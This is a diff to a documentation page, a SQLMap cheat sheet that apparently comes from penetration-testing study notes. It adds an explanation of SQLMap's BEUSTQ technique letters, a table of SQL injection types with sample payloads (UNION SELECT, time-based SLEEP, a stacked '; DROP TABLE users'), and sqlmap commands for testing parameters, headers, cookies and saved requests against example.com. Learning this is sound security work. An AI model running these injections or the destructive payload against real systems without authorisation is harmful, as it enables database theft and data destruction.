@@ -589,6 +589,24 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#beustq" class="md-nav__link">
+    <span class="md-ellipsis">
+      BEUSTQ
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection Types
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#commands" class="md-nav__link">
     <span class="md-ellipsis">
       Commands
@@ -1131,6 +1149,24 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#beustq" class="md-nav__link">
+    <span class="md-ellipsis">
+      BEUSTQ
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection Types
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#commands" class="md-nav__link">
     <span class="md-ellipsis">
       Commands
@@ -1156,7 +1192,69 @@
 
 
 <h1 id="sqlmap-essentials-cheat-sheet">SQLMap Essentials Cheat Sheet</h1>
+<h2 id="beustq">BEUSTQ</h2>
+<p>BEUSTQ is SQLMap's default technique setting, representing SQLi types: </p>
+<ul>
+<li>B (Boolean-based blind)</li>
+<li>E (Error-based)</li>
+<li>U (Union query-based)</li>
+<li>S (Stacked queries)</li>
+<li>T (Time-based blind)</li>
+<li>Q (Inline queries).</li>
+</ul>
+<h2 id="sql-injection-types">SQL Injection Types</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+<th>Example</th>
+<th>Key Points</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Boolean-Based Blind</td>
+<td>Infers data via true/false responses.</td>
+<td><code>AND 1=1</code></td>
+<td>Useful with no output; slow, character-by-character.</td>
+</tr>
+<tr>
+<td>Error-Based</td>
+<td>Triggers errors to reveal data.</td>
+<td><code>AND GTID_SUBSET(@@version,0)</code></td>
+<td>Fast for chunks; requires visible errors.</td>
+</tr>
+<tr>
+<td>Union Query-Based</td>
+<td>Appends results with UNION.</td>
+<td><code>UNION ALL SELECT 1,@@version,3</code></td>
+<td>Fastest with direct output; needs column match.</td>
+</tr>
+<tr>
+<td>Stacked Queries</td>
+<td>Executes multiple statements.</td>
+<td><code>; DROP TABLE users</code></td>
+<td>For non-query statements; DBMS-specific.</td>
+</tr>
+<tr>
+<td>Time-Based Blind</td>
+<td>Delays response for inference.</td>
+<td><code>AND 1=IF(2&gt;1,SLEEP(5),0)</code></td>
+<td>Useful with no response change; slower due to delays.</td>
+</tr>
+<tr>
+<td>Inline Queries</td>
+<td>Embeds query within original.</td>
+<td><code>SELECT (SELECT @@version) from</code></td>
+<td>Uncommon; for specific app structures.</td>
+</tr>
+</tbody>
+</table>
 <h2 id="commands">Commands</h2>
+<p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLMap wiki</a></p>
+<p><strong>Note:</strong> When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).</p>
+<p><strong>Note:</strong> SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*").</p>
 <table>
 <thead>
 <tr>
@@ -1175,23 +1273,35 @@
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</code></td>
-<td>Run SQLMap without asking for user input</td>
+<td>Run SQLMap without asking for user input, id will be tested</td>
+</tr>
+<tr>
+<td><code>sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'</code></td>
+<td>Run SQLMap with request headers, use copy as curl in developer tools and replace <code>curl</code> with <code>sqlmap</code></td>
 </tr>
 <tr>
 <td><code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code></td>
-<td>SQLMap with POST request</td>
+<td>SQLMap with POST request, uid and name will be tested</td>
 </tr>
 <tr>
 <td><code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code></td>
-<td>POST request specifying an injection point with an asterisk</td>
+<td>POST request specifying an injection point with an asterisk, can be used within saved request file also</td>
 </tr>
 <tr>
 <td><code>sqlmap -r req.txt</code></td>
-<td>Passing an HTTP request file to SQLMap</td>
+<td>Passing an HTTP request file to SQLMap, right-click the request within Burp and choose Copy to file or Copy &gt; Copy Request Headers in browser (can use JSON formatted and XML formatted HTTP requests, copy raw request from network tab in dev tools)</td>
 </tr>
 <tr>
 <td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
 <td>Specifying a cookie header</td>
+</tr>
+<tr>
+<td><code>sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
+<td>Specifying a cookie header</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --random-agent</code></td>
+<td>Randomly select a User-agent header value or use <code>--mobile</code> switch to imitate the smartphone</td>
 </tr>
 <tr>
 <td><code>sqlmap -u www.target.com --data='id=1' --method PUT</code></td>
